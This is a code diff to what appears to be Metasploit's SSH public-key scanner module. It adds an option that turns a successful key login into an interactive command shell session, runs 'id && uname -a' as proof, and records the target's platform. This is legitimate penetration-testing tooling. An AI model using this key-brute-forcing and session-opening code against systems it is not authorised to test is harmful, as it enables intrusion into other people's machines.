@@ -9,12 +9,15 @@ require 'net/ssh'
 require 'sshkey'
 require 'net/ssh/pubkey_verifier'
 require 'tempfile'
+require 'metasploit/framework/ssh/platform'
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::AuthBrute
+  include Msf::Auxiliary::CommandShell
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::SSH
+  include Msf::Sessions::CreateSessionOptions
   include Msf::Exploit::Deprecated
   moved_from 'auxiliary/scanner/ssh/ssh_identify_pubkeys'
 
@@ -385,8 +388,9 @@ class MetasploitModule < Msf::Auxiliary
           nil
         end
 
+        ssh_socket = nil
         proof = nil
-        if success && datastore['GatherProof'] && !key_data[:private].empty?
+        if success && !key_data[:private].empty? && (datastore['GatherProof'] || datastore['CreateSession'])
           begin
             auth_opts = {
               auth_methods: ['publickey'],
@@ -400,11 +404,27 @@ class MetasploitModule < Msf::Auxiliary
             }
 
             auth_opts[:verbose] = :debug if datastore['SSH_DEBUG']
-            ::Timeout.timeout(10) do
-              Net::SSH.start(ip, user, auth_opts) do |conn|
-                proof = conn.exec!('id && uname -a').to_s
-              end
+            ::Timeout.timeout(datastore['SSH_TIMEOUT']) do
+              ssh_socket = Net::SSH.start(ip, user, auth_opts)
             end
+          rescue StandardError
+            nil
+          end
+        end
+
+        if datastore['GatherProof'] && ssh_socket
+          begin
+            ::Timeout.timeout(5) { proof = ssh_socket.exec!('id && uname -a').to_s }
+          rescue StandardError
+            nil
+          end
+        end
+
+        # Only close the socket immediately if we won't need it for a session
+        keep_socket = success && datastore['CreateSession'] && ssh_socket
+        unless keep_socket
+          begin
+            ::Timeout.timeout(1) { ssh_socket&.close }
           rescue StandardError
             nil
           end
@@ -446,8 +466,45 @@ class MetasploitModule < Msf::Auxiliary
         proof: proof
       }
       do_report(ip, rport, user, key_hash)
+
+      if datastore['CreateSession'] && !private_key_present
+        print_warning("#{ip}:#{rport} - Key accepted for #{user} but no private key available — cannot create session (public key only)")
+      end
+
+      next unless datastore['CreateSession'] && private_key_present
+
+      begin
+        session_setup(ip, rport, user, ssh_socket)
+      rescue StandardError => e
+        elog('Failed to setup the session', error: e)
+        print_error("#{ip}:#{rport} - Failed to create session: #{e.class} #{e.message}")
+      end
     end
     return [:fail, nil] unless any_accepted
+  end
+
+  def session_setup(ip, _port, user, ssh_socket)
+    platform = Metasploit::Framework::Ssh::Platform.get_platform(ssh_socket)
+
+    sess = Msf::Sessions::SshCommandShellBind.new(ssh_socket)
+
+    merge_me = {
+      'USERPASS_FILE' => nil,
+      'USER_FILE' => nil,
+      'PASS_FILE' => nil,
+      'PASSWORD' => nil,
+      'USERNAME' => user
+    }
+
+    s = start_session(self, nil, merge_me, false, sess.rstream, sess)
+    sockets.delete(ssh_socket.transport.socket)
+    s.platform = platform
+
+    host_info = { host: ip }
+    host_info[:os_name] = platform.capitalize unless platform == 'unknown'
+    report_host(host_info)
+
+    s
   end
 
   def do_report(ip, port, user, key)
